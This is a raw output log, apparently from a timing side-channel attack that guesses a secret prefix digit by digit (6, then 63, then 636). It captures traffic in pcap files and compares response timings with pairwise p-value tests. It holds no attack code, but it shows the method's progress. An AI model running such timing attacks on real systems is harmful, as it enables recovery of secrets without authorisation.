58200 1005.996551 59.716641
58300 1007.673485 59.632639
58400 1009.353189 59.534301
58500 1011.033217 59.522819
58600 1012.713289 59.521256
58700 1014.391369 59.591920
58800 1016.064903 59.753785
58900 1017.743048 59.589609
59000 1019.422801 59.532560
59100 1021.102631 59.529839
59200 1022.784343 59.463208
59300 1024.461279 59.632571
59400 1026.138374 59.626917
59500 1027.817410 59.557979
59600 1029.497369 59.525260
59700 1031.177049 59.535154
59800 1032.856762 59.533980
59900 1035.527011 37.449691
60000 1037.207634 59.501742
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-15-59-19.pcap
Parsing  data/2014-10-30-15-59-34.pcap
Parsing  data/2014-10-30-15-59-49.pcap
Parsing  data/2014-10-30-16-00-04.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 5194
61 5193
62 5194
63 5195
64 5196
65 5194
66 5196
67 5193
k1 k2 p
60  61  0.279598204356
60  62  0.271244083188
60  63  0.00520695079586
60  64  0.281181845359
60  65  0.751347178798
60  66  0.386797097715
60  67  0.465987645093
61  62  0.0533869940054
61  63  0.000716848304873
61  64  0.0846506801179
61  65  0.415856895593
61  66  0.17197335617
61  67  0.991236865626
62  63  0.257784345017
62  64  0.822822641311
62  65  0.0325490016262
62  66  0.512449241789
62  67  0.0497617859722
63  64  0.376319590804
63  65  0.00587653870989
63  66  0.0616417788742
63  67  0.000564874725884
64  65  0.044912950173
64  66  0.55865490313
64  67  0.0749725080918
65  66  0.217959992258
65  67  0.416087433136
66  67  0.0925979671531
{'60': 1, '61': 3, '62': 3, '63': 5, '64': 3, '65': 3, '66': 2, '67': 4}
Collecting data:
60100 1040.571461 29.728045
60200 1042.247356 59.669610
60300 1043.927099 59.532915
60400 1045.606379 59.549329
60500 1047.285999 59.537275
60600 1048.964332 59.582938
60700 1050.637948 59.750857
60800 1052.315408 59.613942
60900 1053.995353 59.525759
61000 1055.674927 59.538906
61100 1057.354414 59.541991
61200 1059.032012 59.609036
61300 1060.705328 59.761575
61400 1062.384258 59.561743
61500 1064.063942 59.535010
61600 1065.743472 59.540470
61700 1067.423076 59.537842
61800 1069.098959 59.670035
61900 1070.772739 59.745010
62000 1072.452207 59.542668
62100 1074.131715 59.541239
62200 1075.811428 59.533988
62300 1077.491088 59.535856
62400 1079.165921 59.707443
62500 1080.841283 59.688597
62600 1082.521265 59.524441
62700 1084.201068 59.530794
62800 1085.880664 59.538129
62900 1087.560173 59.541205
63000 1089.233920 59.746193
Current guess:  6
Parsing data...
Parsing  data/2014-10-30-16-00-19.pcap
Parsing  data/2014-10-30-16-00-34.pcap
Parsing  data/2014-10-30-16-00-49.pcap
Calculating next guess...
Key Count (Number of loaded samples)
60 5512
61 5509
62 5511
63 5511
64 5513
65 5510
66 5513
67 5510
k1 k2 p
60  61  0.348990845444
60  62  0.525966669114
60  63  0.00524176286075
60  64  0.409054963528
60  65  0.581571327885
60  66  0.633508596054
60  67  0.536851624894
61  62  0.121571304958
61  63  0.00121612251971
61  64  0.171815415038
61  65  0.737327174956
61  66  0.452025707278
61  67  0.975567147703
62  63  0.097649707222
62  64  0.888604234455
62  65  0.0428390884797
62  66  0.562933036488
62  67  0.160268644021
63  64  0.271767202013
63  65  0.00134061923398
63  66  0.0251991315456
63  67  0.000651793833151
64  65  0.0320716790068
64  66  0.420572168226
64  67  0.0872963879975
65  66  0.283783189891
65  67  0.396039681518
66  67  0.305252511966
{'60': 1, '61': 1, '62': 2, '63': 6, '64': 2, '65': 3, '66': 1, '67': 2}
CHANGING GUESS:  63
Guess time:  781.477769136
mkdir -p data
mkdir -p tmp
rm -rf data/*
rm -rf tmp/*
rm -rf *.pyc
Collecting data:
Making new username generators with prefix: 63
63100 1092.486396 30.745807
63200 1094.166479 59.520868
63300 1095.847241 59.496822
63400 1097.521142 59.740687
63500 1099.197447 59.655013
63600 1100.877214 59.532070
63700 1102.558596 59.474886
63800 1104.238479 59.527955
63900 1105.916992 59.576540
64000 1107.590666 59.748788
64100 1109.268453 59.602328
64200 1110.948290 59.529586
64300 1112.628301 59.523419
64400 1114.307725 59.544223
64500 1115.984642 59.633241
64600 1117.658681 59.735769
64700 1119.337565 59.563376
64800 1121.017339 59.531816
64900 1122.697380 59.522363
65000 1124.377440 59.521678
65100 1126.053336 59.669576
65200 1127.728100 59.709900
65300 1129.408129 59.522785
65400 1131.087607 59.542313
65500 1132.767590 59.524407
65600 1134.448044 59.507728
65700 1136.122358 59.725961
65800 1137.799076 59.640321
65900 1139.478765 59.534825
66000 1141.159077 59.512760
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-01-19.pcap
Parsing  data/2014-10-30-16-01-34.pcap
Parsing  data/2014-10-30-16-01-49.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 336
631 334
632 335
633 336
634 335
635 334
636 335
637 335
Collecting data:
66100 1143.658809 40.004288
66200 1145.338764 59.525404
66300 1147.018965 59.516687
66400 1148.698674 59.534123
66500 1150.372728 59.735233
66600 1152.048974 59.657109
66700 1153.729033 59.521721
66800 1155.409175 59.518781
66900 1157.089011 59.529620
67000 1158.767822 59.565964
67100 1160.441232 59.758220
67200 1162.118859 59.608003
67300 1163.798472 59.537529
67400 1165.478341 59.528454
67500 1167.158147 59.530684
67600 1168.835119 59.631282
67700 1170.509018 59.740763
67800 1172.188011 59.559510
67900 1173.867782 59.531926
68000 1175.548546 59.496754
68100 1177.228323 59.531706
68200 1178.904507 59.659324
68300 1180.579146 59.714363
68400 1182.258734 59.538408
68500 1183.938828 59.520479
68600 1185.619255 59.508690
68700 1187.300060 59.495294
68800 1188.973959 59.740763
68900 1190.650208 59.657007
69000 1192.329907 59.534478
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-02-04.pcap
Parsing  data/2014-10-30-16-02-19.pcap
Parsing  data/2014-10-30-16-02-34.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 664
631 663
632 664
633 665
634 664
635 663
636 664
637 665
Collecting data:
69100 1194.803338 40.429669
69200 1196.483684 59.511553
69300 1198.163375 59.534765
69400 1199.843308 59.526181
69500 1201.523205 59.527457
69600 1203.197472 59.727637
69700 1204.874109 59.643196
69800 1206.554039 59.526291
69900 1208.233997 59.525302
70000 1209.914085 59.520690
70100 1211.592641 59.575017
70200 1213.266657 59.736586
70300 1214.944762 59.591023
70400 1216.624985 59.515910
70500 1218.304928 59.525835
70600 1219.985290 59.510978
70700 1221.662855 59.610214
70800 1223.336396 59.753538
70900 1225.015448 59.557421
71000 1226.695357 59.527034
71100 1228.375133 59.531740
71200 1230.055285 59.518427
71300 1231.731337 59.664025
71400 1233.406606 59.691902
71500 1235.087367 59.496855
71600 1236.768347 59.489109
71700 1238.449245 59.492011
71800 1240.130204 59.489851
71900 1241.806166 59.667225
72000 1243.482578 59.651204
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-02-49.pcap
Parsing  data/2014-10-30-16-03-04.pcap
Parsing  data/2014-10-30-16-03-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 993
631 992
632 993
633 994
634 993
635 992
636 993
637 994
Collecting data:
72100 1246.000014 39.722960
72200 1247.673743 59.746822
72300 1249.353347 59.537850
72400 1251.033127 59.531605
72500 1252.712959 59.529755
72600 1254.392908 59.525623
72700 1256.068613 59.676368
72800 1257.743818 59.694187
72900 1259.423514 59.534588
73000 1261.103200 59.534934
73100 1262.783046 59.529265
73200 1264.462856 59.530540
73300 1266.137082 59.729100
73400 1267.813650 59.645656
73500 1269.493352 59.534368
73600 1271.174171 59.494805
73700 1272.854965 59.495691
73800 1274.533629 59.571184
73900 1276.207539 59.740372
74000 1277.885990 59.578740
74100 1279.566405 59.509104
74200 1281.246374 59.524914
74300 1282.926266 59.527634
74400 1284.603350 59.627307
74500 1286.277674 59.725595
74600 1287.957207 59.540360
74700 1289.637040 59.529729
74800 1291.317247 59.516476
74900 1292.997337 59.520623
75000 1294.673219 59.670069
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-03-34.pcap
Parsing  data/2014-10-30-16-03-49.pcap
Parsing  data/2014-10-30-16-04-04.pcap
Parsing  data/2014-10-30-16-04-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 1433
631 1432
632 1433
633 1435
634 1434
635 1432
636 1434
637 1435
Collecting data:
75100 1297.328403 37.662173
75200 1299.008022 59.537318
75300 1300.681996 59.738083
75400 1302.358858 59.635200
75500 1304.038620 59.532239
75600 1305.718465 59.529307
75700 1307.398122 59.535965
75800 1309.076635 59.576540
75900 1310.750358 59.747044
76000 1312.427927 59.610061
76100 1314.107546 59.537318
76200 1315.787688 59.518773
76300 1317.467504 59.530329
76400 1319.144915 59.615687
76500 1320.818798 59.741333
76600 1322.497981 59.552770
76700 1324.177522 59.540073
76800 1325.857411 59.527744
76900 1327.537009 59.538053
77000 1329.212930 59.668685
77100 1330.887532 59.715681
77200 1332.567590 59.521755
77300 1334.247648 59.521755
77400 1335.928618 59.489463
77500 1337.608465 59.529231
77600 1339.283356 59.705378
77700 1340.959443 59.662778
77800 1342.639155 59.534013
77900 1344.319002 59.529231
78000 1345.998696 59.534656
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-04-34.pcap
Parsing  data/2014-10-30-16-04-49.pcap
Parsing  data/2014-10-30-16-05-04.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 1761
631 1761
632 1761
633 1762
634 1762
635 1760
636 1761
637 1762
k1 k2 p
630  631  0.878262050712
630  632  0.981940922662
630  633  0.33733289881
630  634  0.466429686184
630  635  0.770839177978
630  636  0.914404485153
630  637  0.528430724618
631  632  0.808193978498
631  633  0.736362888865
631  634  0.129016783742
631  635  0.354862349903
631  636  0.67850569252
631  637  0.560748610813
632  633  0.515493298922
632  634  0.407563620901
632  635  0.869521298061
632  636  0.321101784333
632  637  0.322808089019
633  634  0.0292354449362
633  635  0.218987082304
633  636  0.365901244165
633  637  0.178350898113
634  635  0.245201061015
634  636  0.0805841362624
634  637  0.44492271146
635  636  0.289099904654
635  637  0.110892856288
636  637  0.270609750791
{'633': 1, '634': 2, '636': 1}
Collecting data:
78100 1348.699257 37.029343
78200 1350.380151 59.492146
78300 1352.059940 59.531292
78400 1353.738419 59.577742
78500 1355.412402 59.737768
78600 1357.090467 59.592445
78700 1358.770149 59.535078
78800 1360.449882 59.533270
78900 1362.129754 59.528352
79000 1363.807433 59.606156
79100 1365.481631 59.730086
79200 1367.160675 59.557700
79300 1368.840283 59.537706
79400 1370.519969 59.534934
79500 1372.199903 59.526147
79600 1373.875827 59.668583
79700 1375.550533 59.711965
79800 1377.230649 59.519702
79900 1378.910624 59.524694
80000 1380.590444 59.530194
80100 1382.270207 59.532205
80200 1383.945451 59.692794
80300 1385.620441 59.701851
80400 1389.032496 29.307851
80500 1390.712390 59.527566
80600 1392.392022 59.536853
80700 1394.066361 59.725060
80800 1395.743677 59.619060
80900 1397.423736 59.521721
81000 1399.103664 59.526358
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-05-19.pcap
Parsing  data/2014-10-30-16-05-34.pcap
Parsing  data/2014-10-30-16-05-49.pcap
Parsing  data/2014-10-30-16-06-04.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 2187
631 2187
632 2187
633 2189
634 2188
635 2187
636 2187
637 2188
k1 k2 p
630  631  0.816786469827
630  632  0.863385871741
630  633  0.362029936209
630  634  0.6663359901
630  635  0.605696493686
630  636  0.940731667344
630  637  0.630149122559
631  632  0.434366853359
631  633  0.510974351529
631  634  0.287809245123
631  635  0.695758193299
631  636  0.673455546045
631  637  0.779254549291
632  633  0.497531278465
632  634  0.655169268229
632  635  0.88255224737
632  636  0.260182210376
632  637  0.295430279521
633  634  0.058660983409
633  635  0.454435843755
633  636  0.138601040064
633  637  0.189617087415
634  635  0.415320902098
634  636  0.189382992575
634  637  0.559570000153
635  636  0.37511557997
635  637  0.232220456814
636  637  0.310748355977
{'633': 1, '634': 1}
Collecting data:
81100 1401.937424 35.288803
81200 1403.617599 59.517607
81300 1405.297599 59.523816
81400 1406.978591 59.488678
81500 1408.658737 59.518638
81600 1410.333502 59.709866
81700 1412.010277 59.638295
81800 1413.690143 59.528563
81900 1415.369858 59.533903
82000 1417.049794 59.526080
82100 1418.728436 59.571962
82200 1420.402000 59.752721
82300 1422.079896 59.598449
82400 1423.759843 59.525691
82500 1425.439973 59.519204
82600 1427.119785 59.530473
82700 1428.797156 59.617102
82800 1430.470603 59.756892
82900 1432.149726 59.554901
83000 1433.829580 59.528986
83100 1435.509491 59.526958
83200 1437.189946 59.507694
83300 1438.865761 59.672454
83400 1440.540813 59.699642
83500 1442.221042 59.515699
83600 1443.900835 59.531140
83700 1445.580796 59.525193
83800 1447.260865 59.521366
83900 1448.935388 59.718503
84000 1450.611514 59.661386
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-06-19.pcap
Parsing  data/2014-10-30-16-06-34.pcap
Parsing  data/2014-10-30-16-06-49.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 2513
631 2513
632 2513
633 2515
634 2514
635 2514
636 2514
637 2515
k1 k2 p
630  631  0.246297100803
630  632  0.959359877027
630  633  0.196214472524
630  634  0.929424390907
630  635  0.899014299389
630  636  0.557100540624
630  637  0.528985108142
631  632  0.520252247223
631  633  0.38564411296
631  634  0.216750156648
631  635  0.502931819466
631  636  0.194342404886
631  637  0.549816186454
632  633  0.494898974883
632  634  0.72105643481
632  635  0.984948110854
632  636  0.346318449761
632  637  0.301031192115
633  634  0.115882674969
633  635  0.320131326603
633  636  0.0156341929941
633  637  0.0978075840124
634  635  0.732234855441
634  636  0.423387708596
634  637  0.560911836268
635  636  0.158055413279
635  637  0.214957617026
636  637  0.484627903559
{'633': 2, '636': 1, '637': 1}
Collecting data:
84100 1453.408240 35.756095
84200 1455.083776 59.682389
84300 1456.759911 59.661063
84400 1458.441271 59.475671
84500 1460.121367 59.520403
84600 1461.801431 59.521543
84700 1463.477862 59.650534
84800 1465.152306 59.721318
84900 1466.832241 59.526105
85000 1468.512282 59.522363
85100 1470.192623 59.511730
85200 1471.872586 59.525117
85300 1473.549218 59.643383
85400 1475.224966 59.674840
85500 1476.904871 59.527178
85600 1478.584845 59.524736
85700 1480.264550 59.534258
85800 1481.943846 59.548763
85900 1483.618417 59.716786
86000 1485.295766 59.617890
86100 1486.976753 59.488856
86200 1488.657929 59.482174
86300 1490.337706 59.531715
86400 1492.016264 59.574941
86500 1493.689890 59.750508
86600 1495.368623 59.568730
86700 1497.048483 59.528775
86800 1498.728602 59.519592
86900 1500.408405 59.530794
87000 1502.086573 59.588788
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-07-04.pcap
Parsing  data/2014-10-30-16-07-19.pcap
Parsing  data/2014-10-30-16-07-34.pcap
Parsing  data/2014-10-30-16-07-49.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 2951
631 2952
632 2951
633 2954
634 2953
635 2951
636 2953
637 2953
k1 k2 p
630  631  0.509556445743
630  632  0.958285738967
630  633  0.613847322072
630  634  0.992344078605
630  635  0.887920271974
630  636  0.262653150192
630  637  0.358889851593
631  632  0.445461826732
631  633  0.350954664446
631  634  0.636193533797
631  635  0.406340613905
631  636  0.190105862624
631  637  0.49726120216
632  633  0.765967710415
632  634  0.910701610002
632  635  0.886068816571
632  636  0.369125160839
632  637  0.236565952566
633  634  0.86400877441
633  635  0.937161558008
633  636  0.0229472223511
633  637  0.244514163796
634  635  0.917426320979
634  636  0.212929760228
634  637  0.32067941467
635  636  0.0509515824895
635  637  0.16349488333
636  637  0.443306270176
{'633': 1, '635': 1, '636': 2}
Collecting data:
87100 1505.097485 33.212529
87200 1506.777386 59.527313
87300 1508.457242 59.528910
87400 1510.131188 59.739087
87500 1511.807455 59.656362
87600 1513.487586 59.519170
87700 1515.168147 59.503946
87800 1516.847854 59.534191
87900 1518.526991 59.554402
88000 1520.201224 59.728844
88100 1521.878852 59.607969
88200 1523.558664 59.530473
88300 1525.238819 59.518317
88400 1526.918761 59.525860
88500 1528.596159 59.616145
88600 1530.270097 59.739368
88700 1531.948692 59.573638
88800 1533.628680 59.524230
88900 1535.308597 59.526755
89000 1536.988568 59.524838
89100 1538.664754 59.659247
89200 1540.339099 59.724847
89300 1542.018803 59.534301
89400 1543.698691 59.527778
89500 1545.378341 59.536210
89600 1547.058088 59.532780
89700 1548.732710 59.714966
89800 1550.408517 59.672743
89900 1552.088174 59.535965
90000 1553.767757 59.538585
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-08-04.pcap
Parsing  data/2014-10-30-16-08-19.pcap
Parsing  data/2014-10-30-16-08-34.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 3276
631 3277
632 3277
633 3279
634 3278
635 3276
636 3278
637 3278
k1 k2 p
630  631  0.52960733742
630  632  0.961381396185
630  633  0.77684604144
630  634  0.977877413542
630  635  0.88312348894
630  636  0.152591543807
630  637  0.195288571708
631  632  0.52619381766
631  633  0.370693599624
631  634  0.651720816293
631  635  0.630764099607
631  636  0.0927844770861
631  637  0.540644133826
632  633  0.649578723388
632  634  0.874353736378
632  635  0.694518303529
632  636  0.238764981165
632  637  0.173055206793
633  634  0.979667693093
633  635  0.975954675874
633  636  0.0100763457348
633  637  0.12694511998
634  635  0.963805998991
634  636  0.0613713953056
634  637  0.200571787611
635  636  0.0195363750752
635  637  0.167817646645
636  637  0.720974174159
{'631': 1, '633': 1, '634': 1, '635': 1, '636': 4}
Collecting data:
90100 1556.682208 34.311778
90200 1558.360829 59.572715
90300 1560.041174 59.511586
90400 1561.721268 59.520479
90500 1563.401495 59.515766
90600 1565.077998 59.647972
90700 1566.752147 59.731839
90800 1568.431984 59.529586
90900 1570.111679 59.534622
91000 1571.792341 59.500358
91100 1573.472597 59.514745
91200 1575.148069 59.684673
91300 1576.823509 59.685811
91400 1578.503279 59.531960
91500 1580.183199 59.526646
91600 1581.862989 59.531250
91700 1583.542307 59.547985
91800 1585.216379 59.734586
91900 1586.893221 59.635912
92000 1588.573510 59.513571
92100 1590.253964 59.507728
92200 1591.934551 59.503017
92300 1593.611929 59.616857
92400 1595.285434 59.754824
92500 1596.964600 59.553379
92600 1598.644434 59.529687
92700 1600.324528 59.520479
92800 1602.004414 59.527854
92900 1603.680631 59.658144
93000 1605.356096 59.684919
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-08-49.pcap
Parsing  data/2014-10-30-16-09-04.pcap
Parsing  data/2014-10-30-16-09-19.pcap
Parsing  data/2014-10-30-16-09-34.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 3714
631 3715
632 3715
633 3717
634 3714
635 3713
636 3715
637 3716
k1 k2 p
630  631  0.546075187725
630  632  0.59972807032
630  633  0.705092756353
630  634  0.967544131949
630  635  0.952047785997
630  636  0.170356177813
630  637  0.426448677921
631  632  0.425163515689
631  633  0.175115168748
631  634  0.809746003798
631  635  0.448735131099
631  636  0.0465398155438
631  637  0.455826649693
632  633  0.595858789848
632  634  0.879026887643
632  635  0.814471784583
632  636  0.126401812924
632  637  0.27447897339
633  634  0.945587267762
633  635  0.881833143126
633  636  0.00644164508225
633  637  0.138475596644
634  635  0.958457741721
634  636  0.0343223295979
634  637  0.386867167938
635  636  0.0437963672801
635  637  0.229034822133
636  637  0.68556034319
{'631': 1, '633': 1, '634': 1, '635': 1, '636': 4}
Collecting data:
93100 1608.486397 31.945810
93200 1610.166007 59.537630
93300 1611.842456 59.649897
93400 1613.516513 59.735122
93500 1615.195878 59.546311
93600 1616.875637 59.532349
93700 1618.555480 59.529374
93800 1620.235610 59.519204
93900 1621.910440 59.707554
94000 1623.585831 59.687561
94100 1625.265638 59.530650
94200 1626.945470 59.529763
94300 1628.624919 59.543335
94400 1630.304034 59.555180
94500 1631.978180 59.731949
94600 1633.655297 59.626128
94700 1635.335199 59.527288
94800 1637.014903 59.534301
94900 1638.694724 59.530152
95000 1640.371938 59.622679
95100 1642.045020 59.769938
95200 1643.723886 59.564010
95300 1645.403725 59.529518
95400 1647.083491 59.532104
95500 1648.762984 59.541772
95600 1650.438811 59.672038
95700 1652.113618 59.708370
95800 1653.793391 59.531850
95900 1655.473238 59.529231
96000 1657.153001 59.532213
Current guess:  63
Parsing data...
Parsing  data/2014-10-30-16-09-49.pcap
Parsing  data/2014-10-30-16-10-04.pcap
Parsing  data/2014-10-30-16-10-19.pcap
Calculating next guess...
Key Count (Number of loaded samples)
630 4038
631 4039
632 4039
633 4041
634 4039
635 4038
636 4039
637 4040
k1 k2 p
630  631  0.646691201366
630  632  0.719973707529
630  633  0.902171410909
630  634  0.995286049499
630  635  0.901181290723
630  636  0.0672653336094
630  637  0.649494249168
631  632  0.461740251305
631  633  0.204046325915
631  634  0.605673412757
631  635  0.415727452436
631  636  0.0206159776392
631  637  0.483465477003
632  633  0.76608719821
632  634  0.763169900737
632  635  0.868595840748
632  636  0.0471574065453
632  637  0.323459558821
633  634  0.993094355091
633  635  0.972181311479
633  636  0.00628406527455
633  637  0.247207390527
634  635  0.988751730631
634  636  0.0113143430851
634  637  0.339842568718
635  636  0.0144964105034
635  637  0.331842526764
636  637  0.503609393903
{'630': 1, '631': 1, '632': 1, '633': 1, '634': 1, '635': 1, '636': 6}
CHANGING GUESS:  636
Guess time:  567.586815119
mkdir -p data
mkdir -p tmp
rm -rf data/*
rm -rf tmp/*
rm -rf *.pyc
Collecting data:
Making new username generators with prefix: 636
96100 1660.200487 32.813932
96200 1661.880283 59.531039
96300 1663.560450 59.517895
96400 1665.241252 59.495404
96500 1666.921131 59.528099
96600 1668.595765 59.714541
96700 1670.271307 59.682176
96800 1671.951102 59.531073
96900 1673.631208 59.520057
97000 1675.311022 59.530397
97100 1676.990054 59.558132
97200 1678.663611 59.752968
97300 1680.341676 59.592445
97400 1682.021297 59.537242
97500 1683.700973 59.535289
97600 1685.380793 59.530194
97700 1687.058179 59.616568
97800 1688.732251 59.734586
97900 1690.410933 59.570541
98000 1692.091147 59.516231
98100 1693.770777 59.536920
98200 1695.450581 59.530760
98300 1697.126908 59.654232
98400 1698.801294 59.723384
98500 1700.480824 59.540462
98600 1702.160622 59.530971
98700 1703.840358 59.533160
98800 1705.519997 59.536608
98900 1707.194765 59.709764
99000 1708.870404 59.678720
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-16-10-49.pcap
Parsing  data/2014-10-30-16-11-04.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 223
6362 223
6361 223
6360 224
6367 223
6366 224
6365 224
6364 223
Collecting data:
99100 1711.209124 42.758435
99200 1712.885528 59.651492
99300 1714.565435 59.527102
99400 1716.245416 59.524483
99500 1717.925294 59.528133
99600 1719.603773 59.577750
99700 1721.277316 59.753470
99800 1722.955724 59.580264
99900 1724.635884 59.518140
100000 1726.316351 59.507272
100100 1727.996440 59.520656
100200 1729.673562 59.625950
100300 1731.347393 59.743188
100400 1733.027038 59.536396
100500 1734.706981 59.525826
100600 1736.387274 59.513427
100700 1738.067228 59.525446
100800 1740.735228 37.481256
100900 1742.415490 59.514533
101000 1744.097011 59.469970
101100 1745.773201 59.659103
101200 1747.459905 59.287228
101300 1749.151100 59.129787
101400 1750.833006 59.456355
101500 1752.516466 59.401471
101600 1754.198671 59.445788
101700 1755.876067 59.616213
101800 1757.555716 59.536244
101900 1759.238241 59.434484
102000 1760.919174 59.490771
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-16-11-19.pcap
Parsing  data/2014-10-30-16-11-34.pcap
Parsing  data/2014-10-30-16-11-49.pcap
Parsing  data/2014-10-30-16-12-04.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 656
6362 657
6361 658
6360 658
6367 657
6366 658
6365 658
6364 658
Collecting data:
102100 1763.525957 38.361461
102200 1765.206609 59.500713
102300 1766.887368 59.496931
102400 1768.566364 59.559400
102500 1770.242016 59.678270
102600 1771.921309 59.548864
102700 1773.602550 59.479871
102800 1775.283604 59.486493
102900 1776.964392 59.495902
103000 1778.642027 59.607723
103100 1780.317131 59.697781
103200 1781.997461 59.512127
103300 1783.678628 59.482486
103400 1785.359657 59.487371
103500 1787.040631 59.489320
103600 1788.717604 59.631257
103700 1791.400109 37.278587
103800 1793.080266 59.518249
103900 1794.755242 59.702353
104000 1796.434630 59.545499
104100 1798.115468 59.494129
104200 1799.796056 59.502983
104300 1801.477067 59.488012
104400 1803.154997 59.597246
104500 1804.828678 59.748542
104600 1806.507010 59.582964
104700 1808.186808 59.530971
104800 1809.866561 59.532560
104900 1811.546165 59.537842
105000 1813.223358 59.623433
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-16-12-19.pcap
Parsing  data/2014-10-30-16-12-34.pcap
Parsing  data/2014-10-30-16-12-49.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 975
6362 978
6361 978
6360 979
6367 978
6366 979
6365 979
6364 978
Collecting data:
105100 1815.738670 39.756500
105200 1817.416683 59.594291
105300 1819.091330 59.714074
105400 1820.769949 59.572783
105500 1822.449666 59.533836
105600 1824.129650 59.524382
105700 1825.809681 59.522709
105800 1827.485987 59.654979
105900 1829.160709 59.711404
106000 1830.840931 59.515944
106100 1832.520703 59.531892
106200 1834.201092 59.510024
106300 1835.880961 59.528454
106400 1837.555786 59.707732
106500 1839.231566 59.673702
106600 1840.911481 59.526823
106700 1842.591846 59.510877
106800 1844.272118 59.514179
106900 1845.951381 59.549929
107000 1847.625582 59.729984
107100 1849.302988 59.615857
107200 1850.982766 59.531681
107300 1852.662405 59.536599
107400 1854.342338 59.526189
107500 1856.020839 59.576963
107600 1857.694820 59.737836
107700 1859.373081 59.585486
107800 1861.053134 59.521932
107900 1862.733085 59.525547
108000 1864.412855 59.531960
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-16-13-04.pcap
Parsing  data/2014-10-30-16-13-19.pcap
Parsing  data/2014-10-30-16-13-34.pcap
Parsing  data/2014-10-30-16-13-49.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 1416
6362 1418
6361 1418
6360 1419
6367 1418
6366 1420
6365 1420
6364 1419
Collecting data:
108100 1867.068843 37.650773
108200 1868.748782 59.525970
108300 1870.428699 59.526747
108400 1872.104521 59.672208
108500 1873.780089 59.681259
108600 1875.460237 59.518562
108700 1877.141099 59.493286
108800 1878.820985 59.527854
108900 1880.501091 59.520048
109000 1882.176255 59.695648
109100 1883.852534 59.655938
109200 1885.532522 59.524238
109300 1887.212558 59.522532
109400 1888.892579 59.523072
109500 1891.561574 37.467284
109600 1893.241651 59.521079
109700 1894.922364 59.498560
109800 1896.601083 59.569230
109900 1898.275403 59.725740
110000 1899.954576 59.553126
110100 1901.634512 59.526080
110200 1903.314906 59.509855
110300 1904.995319 59.509180
110400 1906.672286 59.631460
110500 1908.346389 59.733480
110600 1910.026872 59.506706
110700 1911.706943 59.521290
110800 1913.387047 59.520124
110900 1915.067203 59.518283
111000 1916.744475 59.620628
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-16-14-04.pcap
Parsing  data/2014-10-30-16-14-19.pcap
Parsing  data/2014-10-30-16-14-34.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 1736
6362 1739
6361 1738
6360 1740
6367 1739
6366 1740
6365 1740
6364 1738
k1 k2 p
6363  6362  0.294320514101
6363  6361  0.640899433234
6363  6360  0.443847670413
6363  6367  0.788894867316
6363  6366  0.808581696001
6363  6365  0.620958864727
6363  6364  0.202595483589
6362  6361  0.674970156028
6362  6360  0.838559885962
6362  6367  0.142283673707
6362  6366  0.354453421234
6362  6365  0.197790747543
6362  6364  0.00628013256966
6361  6360  0.837488088899
6361  6367  0.363025486897
6361  6366  0.773978019518
6361  6365  0.451255977866
6361  6364  0.0295185164697
6360  6367  0.188140570006
6360  6366  0.353335235452
6360  6365  0.400643408343
6360  6364  0.0194393607337
6367  6366  0.904180794827
6367  6365  0.326457581611
6367  6364  0.467859393212
6366  6365  0.837590978017
6366  6364  0.195582573665
6365  6364  0.108229376126
{'6360': 1, '6361': 1, '6362': 1, '6364': 3}
Collecting data:
111100 1919.400277 37.653409
111200 1921.080667 59.509990
111300 1922.755044 59.723707
111400 1924.432843 59.601896
111500 1926.116135 59.407402
111600 1927.795899 59.532171
111700 1929.492370 58.945895
111800 1931.169973 59.608858
111900 1932.844332 59.724345
112000 1934.523393 59.557100
112100 1936.203593 59.516721
112200 1937.883664 59.521298
112300 1939.563817 59.518384
112400 1941.240010 59.659001
112500 1942.914510 59.719320
112600 1944.594393 59.527955
112700 1946.274972 59.503304
112800 1947.954665 59.534689
112900 1949.634544 59.528099
113000 1951.309759 59.693830
113100 1952.985701 59.667938
113200 1954.665878 59.517531
113300 1956.345894 59.523250
113400 1958.025682 59.531318
113500 1959.704858 59.553024
113600 1961.379274 59.722313
113700 1963.057747 59.577962
113800 1964.737713 59.525015
113900 1966.417764 59.521999
114000 1968.097736 59.524804
Current guess:  636
Parsing data...
Parsing  data/2014-10-30-16-14-49.pcap
Parsing  data/2014-10-30-16-15-04.pcap
Parsing  data/2014-10-30-16-15-19.pcap
Parsing  data/2014-10-30-16-15-34.pcap
Calculating next guess...
Key Count (Number of loaded samples)
6363 2175
6362 2178
6361 2177
6360 2179
6367 2179
6366 2180
6365 2179
6364 2177
k1 k2 p
6363  6362  0.502005309426
6363  6361  0.411318099441
6363  6360  0.814077870719
6363  6367  0.434543211545
6363  6366  0.948934242316
6363  6365  0.952755573933
6363  6364  0.346722233026
6362  6361  0.981089260908
6362  6360  0.882914155792
6362  6367  0.171374192222
6362  6366  0.647013714597
6362  6365  0.39196194121
6362  6364  0.0367490575249
6361  6360  0.939308044222
6361  6367  0.466806039258
6361  6366  0.543168372764
6361  6365  0.343888991696
6361  6364  0.0259001989421
6360  6367  0.145844532006
